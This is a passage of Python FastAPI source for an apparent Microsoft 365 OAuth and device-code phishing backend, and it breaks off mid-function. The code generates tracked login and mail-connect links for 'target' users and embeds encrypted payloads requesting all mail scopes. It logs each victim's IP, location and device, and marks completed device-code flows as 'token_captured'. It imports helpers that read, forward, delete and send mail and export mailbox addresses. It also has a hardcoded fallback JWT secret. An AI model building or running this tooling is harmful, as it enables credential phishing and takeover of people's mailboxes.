from fastapi import (
    FastAPI,
    Request,
    Depends,
    HTTPException,
    status,
    UploadFile,
    File,
    Form,
)
from fastapi.responses import (
    RedirectResponse,
    JSONResponse,
    StreamingResponse,
    HTMLResponse,
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from sqlalchemy import func, or_
import logging
import io
import csv
import re
import time
import os
import json as _json
import base64 as b64
import requests
from datetime import datetime, timedelta
from urllib.parse import urlencode

from jose import jwt, JWTError

from auth import (
    generate_login_link,
    generate_mail_connect_link,
    generate_org_connect_link,
    generate_org_mail_connect_link,
    generate_admin_consent_url,
    exchange_code_for_token,
    get_token,
    start_device_code_flow,
    poll_device_code_flow,
    save_or_update_tenant_consent,
)
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    move_email_to_folder,
    export_mailbox_email_addresses,
    send_email_with_attachment,
)
from payload_builder import (
    inspect_payload,
    build_encrypted_state,
    encrypt_payload,
    decrypt_payload,
    ALL_MAIL_SCOPES,
    BASIC_PAYLOAD_SCOPES,
    payload_status as get_payload_status,
)
from admin_auth import login_admin
from db import init_db, SessionLocal, record_url_visit
from models import (
    Rule,
    TenantToken,
    RuleAction,
    SavedUser,
    ConnectInvite,
    TenantConsent,
    TenantConsentStatus,
    Alert,
    UrlVisit,
)

app = FastAPI()

SECRET_KEY = os.environ.get("JWT_SECRET_KEY") or os.environ.get(
    "SECRET_KEY", "super-secret-key-change-this"
)
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 10080

CLIENT_ID = os.environ.get("CLIENT_ID", "")
ADMIN_CONSENT_TENANT = os.environ.get(
    "ADMIN_CONSENT_TENANT", "organizations"
)
READ_ONLY_MODE = (
    os.environ.get("READ_ONLY_MODE", "true").lower() == "true"
)
MAX_EXPORT_MESSAGES_PER_MAILBOX = int(
    os.environ.get("MAX_EXPORT_MESSAGES_PER_MAILBOX", "500")
)
WORKER_DOMAIN = os.environ.get("WORKER_DOMAIN", "").strip()
BACKEND_BASE_URL = os.environ.get(
    "BACKEND_BASE_URL",
    "https://oauth-backend-7cuu.onrender.com",
).rstrip("/")

EMAIL_ADDRESS_RE = re.compile(
    r"^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$", re.IGNORECASE
)

# =========================
# IN-MEMORY PAYLOAD CACHE
# =========================
_payload_cache: dict = {}

security = HTTPBearer()


def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(
        minutes=ACCESS_TOKEN_EXPIRE_MINUTES
    )
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)


def verify_token(
    credentials: HTTPAuthorizationCredentials = Depends(security),
):
    try:
        token = credentials.credentials
        payload = jwt.decode(
            token, SECRET_KEY, algorithms=[ALGORITHM]
        )
        return payload
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token",
        )


def resolve_user_id(
    requested_user_id: str | None,
    user_payload: dict,
) -> str:
    return requested_user_id or user_payload["sub"]


def extract_tenant_hint(user_id: str | None) -> str:
    if not user_id:
        return ""
    if "@" in user_id:
        return user_id.split("@", 1)[1].strip().lower()
    return (user_id or "").strip().lower()


def parse_enterprise_notes(notes: str | None) -> dict:
    parsed = {
        "mode": "preview",
        "organization_name": "",
        "notes": notes or "",
    }
    if not notes:
        return parsed
    for part in notes.split(";"):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        key = key.strip().lower()
        value = value.strip()
        if key == "mode" and value:
            parsed["mode"] = value
        elif key in {"org", "organization", "organization_name"}:
            parsed["organization_name"] = value
        elif key == "notes":
            parsed["notes"] = value
    return parsed


def build_enterprise_notes(
    mode: str,
    organization_name: str | None,
    notes: str | None,
) -> str:
    safe_mode = (mode or "preview").strip() or "preview"
    safe_org = (organization_name or "").strip()
    safe_notes = (notes or "").strip()
    return f"mode={safe_mode};org={safe_org};notes={safe_notes}"


# =========================
# GEO LOOKUP HELPER
# =========================
def get_geo_info(ip_address: str | None) -> dict:
    """
    Looks up country and city for an IP address.
    Returns empty strings on failure.
    """
    if not ip_address or ip_address in (
        "127.0.0.1", "::1", "testclient", "localhost"
    ):
        return {"country": "", "city": ""}
    try:
        resp = requests.get(
            f"http://ip-api.com/json/{ip_address}"
            f"?fields=country,city,status",
            timeout=3,
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", ""),
                    "city": data.get("city", ""),
                }
    except Exception:
        pass
    return {"country": "", "city": ""}


# =========================
# USER AGENT PARSER HELPER
# =========================
def parse_user_agent(ua_string: str | None) -> dict:
    """
    Parses a user agent string into device_type, browser, and os.
    Uses the user-agents library if available, otherwise falls
    back to simple string matching.
    """
    if not ua_string:
        return {
            "device_type": "unknown",
            "browser": "unknown",
            "os": "unknown",
        }

    try:
        from user_agents import parse as ua_parse
        ua = ua_parse(ua_string)
        if ua.is_mobile:
            device_type = "mobile"
        elif ua.is_tablet:
            device_type = "tablet"
        else:
            device_type = "desktop"
        return {
            "device_type": device_type,
            "browser": ua.browser.family or "unknown",
            "os": ua.os.family or "unknown",
        }
    except ImportError:
        pass

    # Fallback simple parser
    ua_lower = ua_string.lower()

    if any(x in ua_lower for x in (
        "iphone", "android", "mobile", "blackberry"
    )):
        device_type = "mobile"
    elif any(x in ua_lower for x in ("ipad", "tablet")):
        device_type = "tablet"
    else:
        device_type = "desktop"

    if "edg" in ua_lower:
        browser = "Edge"
    elif "chrome" in ua_lower:
        browser = "Chrome"
    elif "firefox" in ua_lower:
        browser = "Firefox"
    elif "safari" in ua_lower:
        browser = "Safari"
    elif "opera" in ua_lower or "opr" in ua_lower:
        browser = "Opera"
    elif "msie" in ua_lower or "trident" in ua_lower:
        browser = "Internet Explorer"
    else:
        browser = "unknown"

    if "windows" in ua_lower:
        os_name = "Windows"
    elif "mac os" in ua_lower or "macos" in ua_lower:
        os_name = "macOS"
    elif "linux" in ua_lower:
        os_name = "Linux"
    elif "android" in ua_lower:
        os_name = "Android"
    elif "iphone" in ua_lower or "ipad" in ua_lower or "ios" in ua_lower:
        os_name = "iOS"
    else:
        os_name = "unknown"

    return {
        "device_type": device_type,
        "browser": browser,
        "os": os_name,
    }


# =========================
# VISIT RECORDER HELPER
# =========================
def record_visit_from_request(
    request: Request,
    target_user_id: str | None = None,
    admin_user_id: str | None = None,
    url_type: str = "unknown",
    outcome: str = "visited",
):
    """
    Records a URL visit from a FastAPI Request object.
    Extracts IP, user agent, geo, device info automatically.

    CRITICAL: If admin_user_id is not passed in (e.g. from
    auth/callback which has no JWT), we fall back to looking
    it up from the database via target_user_id so visits are
    always queryable by the correct admin.
    """
    try:
        # --------------------------------------------------
        # Extract IP — handle Cloudflare, nginx, Render
        # --------------------------------------------------
        ip_address = (
            request.headers.get("cf-connecting-ip")
            or request.headers.get("x-real-ip")
            or request.headers.get(
                "x-forwarded-for", ""
            ).split(",")[0].strip()
            or (
                request.client.host
                if request.client
                else "127.0.0.1"
            )
        )

        user_agent = request.headers.get("user-agent", "")
        referrer = request.headers.get("referer", "")

        # --------------------------------------------------
        # Parse user agent and geo
        # --------------------------------------------------
        ua_info = parse_user_agent(user_agent)
        geo = get_geo_info(ip_address)

        # --------------------------------------------------
        # Resolve admin_user_id
        # auth/callback has no JWT so admin_user_id may be
        # None or empty. Look it up from SavedUser or
        # TenantToken so the visit is always findable.
        # --------------------------------------------------
        resolved_admin_id = admin_user_id or ""

        if not resolved_admin_id and target_user_id:
            try:
                _db = SessionLocal()
                try:
                    # Try SavedUser first
                    saved = (
                        _db.query(SavedUser)
                        .filter(
                            SavedUser.user_id == target_user_id
                        )
                        .first()
                    )
                    if saved and saved.admin_user_id:
                        resolved_admin_id = saved.admin_user_id

                    # Fall back to TenantToken
                    if not resolved_admin_id:
                        token_row = (
                            _db.query(TenantToken)
                            .filter(
                                TenantToken.tenant_id
                                == target_user_id
                            )
                            .first()
                        )
                        if token_row and getattr(
                            token_row, "admin_user_id", None
                        ):
                            resolved_admin_id = (
                                token_row.admin_user_id
                            )
                finally:
                    _db.close()
            except Exception as lookup_err:
                logging.warning(
                    f"[record_visit] admin lookup failed: "
                    f"{lookup_err}"
                )

        # Use sentinel so visits are never silently lost
        if not resolved_admin_id:
            resolved_admin_id = "__unresolved__"

        logging.info(
            f"[record_visit] "
            f"target={target_user_id} "
            f"admin={resolved_admin_id} "
            f"type={url_type} "
            f"outcome={outcome} "
            f"ip={ip_address} "
            f"country={geo.get('country')} "
            f"device={ua_info.get('device_type')} "
            f"browser={ua_info.get('browser')}"
        )

        db = SessionLocal()
        try:
            record_url_visit(
                db=db,
                target_user_id=target_user_id,
                admin_user_id=resolved_admin_id,
                ip_address=ip_address,
                user_agent=user_agent,
                referrer=referrer,
                url_type=url_type,
                outcome=outcome,
                country=geo.get("country", ""),
                city=geo.get("city", ""),
                device_type=ua_info.get("device_type", ""),
                browser=ua_info.get("browser", ""),
                os=ua_info.get("os", ""),
            )
        finally:
            db.close()

    except Exception as e:
        logging.error(
            f"[record_visit_from_request] Failed: {e}",
            exc_info=True,
        )


logging.basicConfig(level=logging.DEBUG)

origins = [
    "http://localhost:3000",
    "https://frontend-xg84.onrender.com",
]

FRONTEND_ORIGIN = os.environ.get("FRONTEND_ORIGIN")
if FRONTEND_ORIGIN and FRONTEND_ORIGIN not in origins:
    origins.append(FRONTEND_ORIGIN)

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.middleware("http")
async def log_requests(request: Request, call_next):
    logging.debug("\n--- REQUEST START ---")
    logging.debug(f"{request.method} {request.url}")
    logging.debug(f"Headers: {request.headers}")
    response = await call_next(request)
    logging.debug(f"Response Status: {response.status_code}")
    logging.debug("--- REQUEST END ---\n")
    return response


@app.on_event("startup")
def startup():
    init_db()


# =========================
# HEALTH / CONFIG
# =========================
@app.get("/")
def root():
    return {
        "status": "ok",
        "service": "browser-only Outlook dashboard backend",
        "device_code_enabled": True,
        "oauth_callback_enabled": True,
        "payload_builder_enabled": True,
        "worker_relay_enabled": bool(WORKER_DOMAIN),
        "worker_domain": WORKER_DOMAIN or "not configured",
    }


@app.get("/app-config")
def get_app_config():
    return {
        "read_only_mode": READ_ONLY_MODE,
        "device_code_preferred": True,
        "admin_consent_tenant": ADMIN_CONSENT_TENANT,
        "worker_relay_enabled": bool(WORKER_DOMAIN),
        "worker_domain": WORKER_DOMAIN or "not configured",
    }


@app.get("/ping")
def ping():
    return {
        "status": "alive",
        "timestamp": int(time.time()),
        "service": "oauth-backend",
    }


# =========================
# DASHBOARD
# =========================
@app.get("/dashboard/summary")
def dashboard_summary(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        saved_users_count = (
            db.query(SavedUser)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .count()
        )
        connected_mailboxes_count = (
            db.query(TenantToken.tenant_id).distinct().count()
        )
        approved_tenants_count = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.status == TenantConsentStatus.APPROVED,
            )
            .count()
        )
        pending_tenants_count = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.status == TenantConsentStatus.PENDING,
            )
            .count()
        )
        enterprise_enabled_count = 0
        approved_rows = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.status == TenantConsentStatus.APPROVED,
            )
            .all()
        )
        for row in approved_rows:
            mode = parse_enterprise_notes(
                getattr(row, "notes", "")
            ).get("mode", "preview")
            if mode == "enterprise_full":
                enterprise_enabled_count += 1

        return {
            "saved_users_count": saved_users_count,
            "connected_mailboxes_count": connected_mailboxes_count,
            "approved_tenants_count": approved_tenants_count,
            "pending_tenants_count": pending_tenants_count,
            "enterprise_enabled_count": enterprise_enabled_count,
        }
    finally:
        db.close()


# =========================
# ADMIN LOGIN
# =========================
@app.post("/admin/login")
async def admin_login_route(request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse(
            {"error": "Invalid JSON"}, status_code=400
        )

    username = body.get("username")
    password = body.get("password")
    result = login_admin(username, password)

    if not result or "error" in result:
        return JSONResponse(
            result or {"error": "Login failed"}, status_code=401
        )

    token = create_access_token({"sub": username})
    return {"access_token": token, "token_type": "bearer"}


# =========================
# TENANT CONSENT
# =========================
@app.post("/tenant-consent/generate")
async def generate_tenant_consent(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(
            status_code=400, detail="tenant_hint is required"
        )

    admin_user_id = user["sub"]
    consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=admin_user_id,
        tenant_hint=tenant_hint,
        admin_consent_url=consent_url,
        status=TenantConsentStatus.PENDING,
    )

    return {
        "tenant_hint": tenant_hint,
        "admin_consent_url": consent_url,
        "status": "pending",
    }


@app.get("/tenant-consents")
def list_tenant_consents(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == admin_user_id)
            .order_by(TenantConsent.updated_at.desc())
            .all()
        )
        return {
            "tenants": [
                {
                    "tenant_hint": r.tenant_hint,
                    "status": (
                        r.status.value
                        if hasattr(r.status, "value")
                        else str(r.status)
                    ),
                    "admin_consent_url": r.admin_consent_url,
                    "notes": r.notes,
                    "created_at": r.created_at,
                    "updated_at": r.updated_at,
                }
                for r in rows
            ]
        }
    finally:
        db.close()


@app.post("/tenant-consent/approve")
async def manually_approve_tenant(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(
            status_code=400, detail="tenant_hint required"
        )

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes="Manually approved",
    )
    return {"status": "approved", "tenant_hint": tenant_hint}


# =========================
# ENTERPRISE
# =========================
@app.get("/enterprise/status")
def enterprise_status(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        tenant_hint = extract_tenant_hint(user_id)

        if not tenant_hint:
            return {
                "tenant_hint": "",
                "mode": "preview",
                "consent_status": "none",
                "enterprise_enabled": False,
                "app_only_enabled": False,
                "notes": "",
            }

        row = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.tenant_hint == tenant_hint,
            )
            .first()
        )

        if not row:
            return {
                "tenant_hint": tenant_hint,
                "mode": "preview",
                "consent_status": "none",
                "enterprise_enabled": False,
                "app_only_enabled": False,
                "notes": "",
            }

        parsed = parse_enterprise_notes(
            getattr(row, "notes", "")
        )
        return {
            "tenant_hint": tenant_hint,
            "mode": parsed["mode"],
            "consent_status": (
                row.status.value
                if hasattr(row.status, "value")
                else str(row.status)
            ),
            "enterprise_enabled": (
                parsed["mode"] == "enterprise_full"
                and row.status == TenantConsentStatus.APPROVED
            ),
            "app_only_enabled": (
                parsed["mode"] == "app_only"
                and row.status == TenantConsentStatus.APPROVED
            ),
            "notes": (
                parsed["notes"]
                or getattr(row, "notes", "")
                or ""
            ),
        }
    finally:
        db.close()


@app.get("/enterprise/tenants")
def list_enterprise_tenants(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == admin_user_id)
            .order_by(TenantConsent.updated_at.desc())
            .all()
        )
        tenants = []
        for row in rows:
            parsed = parse_enterprise_notes(
                getattr(row, "notes", "")
            )
            tenants.append(
                {
                    "tenant_hint": row.tenant_hint,
                    "organization_name": (
                        parsed["organization_name"] or ""
                    ),
                    "mode": parsed["mode"],
                    "consent_status": (
                        row.status.value
                        if hasattr(row.status, "value")
                        else str(row.status)
                    ),
                    "notes": (
                        parsed["notes"]
                        or getattr(row, "notes", "")
                        or ""
                    ),
                    "admin_consent_url": row.admin_consent_url,
                    "created_at": row.created_at,
                    "updated_at": row.updated_at,
                }
            )
        return {"tenants": tenants}
    finally:
        db.close()


@app.post("/enterprise/onboard")
async def enterprise_onboard(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()
    mode = (body.get("mode") or "enterprise_full").strip()
    organization_name = (
        body.get("organization_name") or ""
    ).strip()
    notes = body.get("notes") or ""

    if not tenant_hint:
        raise HTTPException(
            status_code=400, detail="tenant_hint is required"
        )

    admin_consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        admin_consent_url=admin_consent_url,
        status=TenantConsentStatus.PENDING,
        notes=build_enterprise_notes(
            mode, organization_name, notes
        ),
    )

    return {
        "tenant_hint": tenant_hint,
        "mode": mode,
        "organization_name": organization_name,
        "admin_consent_url": admin_consent_url,
        "consent_status": "pending",
    }


@app.post("/enterprise/approve")
async def enterprise_approve(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()
    mode = (body.get("mode") or "enterprise_full").strip()
    organization_name = (
        body.get("organization_name") or ""
    ).strip()
    notes = body.get("notes") or "Manually approved"

    if not tenant_hint:
        raise HTTPException(
            status_code=400, detail="tenant_hint is required"
        )

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes=build_enterprise_notes(
            mode, organization_name, notes
        ),
    )

    return {
        "tenant_hint": tenant_hint,
        "mode": mode,
        "organization_name": organization_name,
        "consent_status": "approved",
    }


# =========================
# URL GENERATORS
# =========================
@app.get("/login")
def login(
    request: Request,
    user_id: str,
    user=Depends(verify_token),
):
    record_visit_from_request(
        request=request,
        target_user_id=user_id,
        admin_user_id=user["sub"],
        url_type="login",
        outcome="visited",
    )
    return RedirectResponse(generate_login_link(user_id))


@app.get("/generate-login-url")
def generate_login_url(
    user_id: str,
    user=Depends(verify_token),
):
    trimmed = (user_id or "").strip()
    if not trimmed:
        raise HTTPException(
            status_code=400, detail="user_id is required"
        )

    cached_payload = _payload_cache.get(trimmed)
    login_url = generate_login_link(
        trimmed,
        cached_payload=cached_payload,
    )
    _payload_cache.pop(trimmed, None)

    return {
        "login_url": login_url,
        "user_id": trimmed,
        "type": "direct_user_login",
        "payload_embedded": cached_payload is not None,
        "scopes": BASIC_PAYLOAD_SCOPES,
        "worker_relay_enabled": bool(WORKER_DOMAIN),
    }


@app.get("/generate-mail-connect-url")
def generate_mail_connect_url(
    user_id: str,
    user=Depends(verify_token),
):
    trimmed = (user_id or "").strip()
    if not trimmed:
        raise HTTPException(
            status_code=400, detail="user_id is required"
        )

    db = SessionLocal()
    try:
        tenant_hint = extract_tenant_hint(trimmed)
        mode = "preview"

        if tenant_hint:
            row = (
                db.query(TenantConsent)
                .filter(
                    TenantConsent.admin_user_id == user["sub"],
                    TenantConsent.tenant_hint == tenant_hint,
                )
                .first()
            )
            if row:
                mode = parse_enterprise_notes(
                    getattr(row, "notes", "")
                ).get("mode", "preview")

        cached_payload = _payload_cache.get(trimmed)
        login_url = generate_mail_connect_link(
            trimmed,
            admin_user_id=user["sub"],
            cached_payload=cached_payload,
        )
        _payload_cache.pop(trimmed, None)

        return {
            "login_url": login_url,
            "user_id": trimmed,
            "tenant_hint": tenant_hint,
            "mode": mode,
            "type": "mail_connect",
            "payload_embedded": cached_payload is not None,
            "scopes": ALL_MAIL_SCOPES,
            "worker_relay_enabled": bool(WORKER_DOMAIN),
        }
    finally:
        db.close()


@app.get("/generate-org-connect-url")
def generate_org_connect_url(
    tenant_hint: str | None = None,
    user=Depends(verify_token),
):
    admin_user_id = user["sub"]
    cached_payload = _payload_cache.get(admin_user_id)

    login_url = generate_org_connect_link(
        admin_user_id,
        tenant_hint,
        cached_payload=cached_payload,
    )
    _payload_cache.pop(admin_user_id, None)

    return {
        "login_url": login_url,
        "tenant_hint": tenant_hint,
        "admin_user_id": admin_user_id,
        "type": "org_connect_invite",
        "payload_embedded": cached_payload is not None,
        "scopes": BASIC_PAYLOAD_SCOPES,
        "worker_relay_enabled": bool(WORKER_DOMAIN),
    }


@app.get("/generate-org-mail-connect-url")
def generate_org_mail_connect_url_route(
    tenant_hint: str | None = None,
    user=Depends(verify_token),
):
    admin_user_id = user["sub"]
    cached_payload = _payload_cache.get(admin_user_id)

    login_url = generate_org_mail_connect_link(
        admin_user_id,
        tenant_hint,
        cached_payload=cached_payload,
    )
    _payload_cache.pop(admin_user_id, None)

    return {
        "login_url": login_url,
        "tenant_hint": tenant_hint,
        "admin_user_id": admin_user_id,
        "type": "org_mail_connect_invite",
        "payload_embedded": cached_payload is not None,
        "scopes": ALL_MAIL_SCOPES,
        "worker_relay_enabled": bool(WORKER_DOMAIN),
    }


@app.get("/generate-admin-consent-url")
def generate_admin_consent_url_route(
    tenant: str | None = None,
    user=Depends(verify_token),
):
    return {
        "admin_consent_url": generate_admin_consent_url(tenant),
        "tenant": tenant or ADMIN_CONSENT_TENANT,
        "client_id": CLIENT_ID,
        "type": "admin_consent",
    }


# =========================
# PAYLOAD BUILDER ENDPOINTS
# =========================
@app.get("/payload/inspect")
def payload_inspect_route(
    token: str,
    user=Depends(verify_token),
):
    if not token:
        raise HTTPException(
            status_code=400, detail="token param required"
        )
    return inspect_payload(token)


@app.get("/payload/scopes")
def payload_scopes_route(user=Depends(verify_token)):
    return {
        "mail_scopes": ALL_MAIL_SCOPES,
        "mail_scope_string": (
            ALL_MAIL_SCOPES
            if isinstance(ALL_MAIL_SCOPES, str)
            else " ".join(ALL_MAIL_SCOPES)
        ),
        "mail_scope_count": (
            len(ALL_MAIL_SCOPES.split())
            if isinstance(ALL_MAIL_SCOPES, str)
            else len(ALL_MAIL_SCOPES)
        ),
        "basic_scopes": BASIC_PAYLOAD_SCOPES,
        "basic_scope_string": (
            BASIC_PAYLOAD_SCOPES
            if isinstance(BASIC_PAYLOAD_SCOPES, str)
            else " ".join(BASIC_PAYLOAD_SCOPES)
        ),
        "basic_scope_count": (
            len(BASIC_PAYLOAD_SCOPES.split())
            if isinstance(BASIC_PAYLOAD_SCOPES, str)
            else len(BASIC_PAYLOAD_SCOPES)
        ),
    }


@app.post("/payload/build")
async def payload_build_route(
    request: Request,
    user=Depends(verify_token),
):
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(
            status_code=400, detail="Invalid JSON body"
        )

    user_id = (body.get("user_id") or "").strip()
    flow_type = (body.get("flow_type") or "user_mail").strip()
    mail_mode = bool(body.get("mail_mode", True))
    admin_user_id = user["sub"]

    if not user_id:
        raise HTTPException(
            status_code=400, detail="user_id is required"
        )

    try:
        encrypted_state = build_encrypted_state(
            flow_type=flow_type,
            user_id=user_id,
            admin_user_id=admin_user_id,
            mail_mode=mail_mode,
        )

        _payload_cache[user_id] = encrypted_state

        if flow_type in ("org_connect", "org_mail"):
            _payload_cache[admin_user_id] = encrypted_state

        scopes = (
            ALL_MAIL_SCOPES if mail_mode else BASIC_PAYLOAD_SCOPES
        )

        return {
            "success": True,
            "user_id": user_id,
            "admin_user_id": admin_user_id,
            "flow_type": flow_type,
            "mail_mode": mail_mode,
            "scope_count": (
                len(scopes.split())
                if isinstance(scopes, str)
                else len(scopes)
            ),
            "encryption": "AES-256-GCM",
            "key_derivation": "PBKDF2-SHA256-100000",
            "cached": True,
            "message": (
                "Payload built and cached. "
                "The next URL generator call will embed it."
            ),
        }

    except Exception as e:
        logging.error(f"payload_build_route error: {e}")
        raise HTTPException(
            status_code=500,
            detail=f"Payload build failed: {str(e)}",
        )


@app.post("/payload/decrypt")
async def payload_decrypt_route(
    request: Request,
    user=Depends(verify_token),
):
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(
            status_code=400, detail="Invalid JSON body"
        )

    token = (body.get("token") or "").strip()
    if not token:
        raise HTTPException(
            status_code=400, detail="token is required"
        )

    result = decrypt_payload(token)
    if result is None:
        return JSONResponse(
            {
                "valid": False,
                "error": "Decryption failed or payload expired",
            },
            status_code=400,
        )
    return {"valid": True, "payload": result}


@app.get("/payload/status")
def payload_status_route(user=Depends(verify_token)):
    try:
        result = get_payload_status()
        result["cache_entries"] = len(_payload_cache)
        result["worker_relay_enabled"] = bool(WORKER_DOMAIN)
        result["worker_domain"] = WORKER_DOMAIN or "not configured"
        return result
    except Exception as e:
        logging.error(f"payload_status error: {e}")
        return JSONResponse(
            {"status": "error", "message": str(e)},
            status_code=500,
        )


# =========================
# DEVICE CODE
# =========================
@app.post("/devicecode")
@app.post("/device-code/start")
async def device_code_start(
    request: Request,
    user=Depends(verify_token),
):
    admin_user_id = user["sub"]

    try:
        body = await request.json()
    except Exception:
        body = {}

    try:
        result = start_device_code_flow(
            mail_mode=bool(body.get("mail_mode")),
            user_id=body.get("user_id"),
            admin_user_id=admin_user_id,
        )
        return {
            "admin_user_id": admin_user_id,
            "user_id": body.get("user_id"),
            "mail_mode": bool(body.get("mail_mode")),
            "payload_builder_active": True,
            **result,
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/device-token")
@app.post("/device-code/poll")
async def device_code_poll(
    request: Request,
    user=Depends(verify_token),
):
    body = await request.json()
    device_code = body.get("device_code")

    if not device_code:
        raise HTTPException(
            status_code=400, detail="device_code is required"
        )

    admin_user_id = body.get("admin_user_id") or user["sub"]
    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    try:
        result = poll_device_code_flow(
            device_code=device_code,
            admin_user_id=admin_user_id,
            client_ip=client_ip,
            user_agent=user_agent,
        )

        if result.get("status") == "complete":
            record_visit_from_request(
                request=request,
                target_user_id=result.get("resolved_user_id"),
                admin_user_id=admin_user_id,
                url_type="device_code",
                outcome="token_captured",
            )

        return result
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


# =========================
# MICROSOFT STATUS
# =========================
@app.get("/microsoft/status")
def microsoft_status(user_id: str, user=Depends(verify_token)):
    token_record = get_token(user_id)
    connected = token_record is not None and bool(
        getattr(token_record, "refresh_token", None)
    )
    inbox_connected = False

    if token_record and getattr(
        token_record, "access_token", None
    ):
        try:
            test_res = requests.get(
                "https://graph.microsoft.com/v1.0/me/mailFolders"
                "?$top=1",
                headers={
                    "Authorization": (
                        f"Bearer {token_record.access_token}"
                    )
                },
                timeout=15,
            )
            inbox_connected = test_res.status_code == 200
        except Exception:
            inbox_connected = False

    return {
        "user_id": user_id,
        "connected": connected,
        "inbox_connected": inbox_connected,
        "has_refresh_token": (
            bool(token_record.refresh_token)
            if token_record
            else False
        ),
        "expires_at": (
            token_record.expires_at if token_record else None
        ),
        "session_id": (
            getattr(token_record, "session_id", None)
            if token_record
            else None
        ),
    }


# =========================
# USERS
# =========================
@app.get("/users")
def list_users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        connected_rows = (
            db.query(TenantToken.tenant_id).distinct().all()
        )
        connected_users = [
            row[0] for row in connected_rows if row[0]
        ]
        saved_rows = (
            db.query(SavedUser.user_id)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .distinct()
            .all()
        )
        saved_users = [row[0] for row in saved_rows if row[0]]
        user_ids = sorted(set(connected_users + saved_users))
        return {"users": user_ids}
    finally:
        db.close()


@app.get("/saved-users")
def get_saved_users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        rows = (
            db.query(SavedUser)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .order_by(SavedUser.user_id.asc())
            .all()
        )
        return {
            "users": [
                {
                    "id": row.id,
                    "admin_user_id": row.admin_user_id,
                    "user_id": row.user_id,
                    "job_title": getattr(row, "job_title", None),
                    "created_at": row.created_at,
                }
                for row in rows
            ]
        }
    finally:
        db.close()


@app.post("/saved-users")
async def add_saved_user(
    request: Request,
    user=Depends(verify_token),
):
    db = SessionLocal()
    try:
        body = await request.json()
        admin_user_id = user["sub"]
        target_user_id = (body.get("user_id") or "").strip()

        if not target_user_id:
            return JSONResponse(
                {"error": "user_id is required"}, status_code=400
            )

        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == target_user_id,
            )
            .first()
        )

        if existing:
            return {
                "message": "User already saved",
                "user_id": target_user_id,
            }

        row = SavedUser(
            admin_user_id=admin_user_id,
            user_id=target_user_id,
        )
        db.add(row)
        db.commit()
        return {
            "message": "User saved",
            "user_id": target_user_id,
        }
    finally:
        db.close()


@app.delete("/saved-users")
def delete_saved_user(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        row = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == user_id,
            )
            .first()
        )
        if not row:
            return JSONResponse(
                {"error": "Saved user not found"}, status_code=404
            )
        db.delete(row)
        db.commit()
        return {
            "message": "Saved user removed",
            "user_id": user_id,
        }
    finally:
        db.close()


# =========================
# CONNECT INVITES
# =========================
@app.get("/connect-invites")
def list_connect_invites(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]
        invites = (
            db.query(ConnectInvite)
            .filter(ConnectInvite.admin_user_id == admin_user_id)
            .order_by(ConnectInvite.created_at.desc())
            .all()
        )
        return {
            "invites": [
